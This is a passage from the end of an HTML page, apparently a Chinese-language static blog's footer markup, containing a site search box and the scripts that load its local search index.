        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>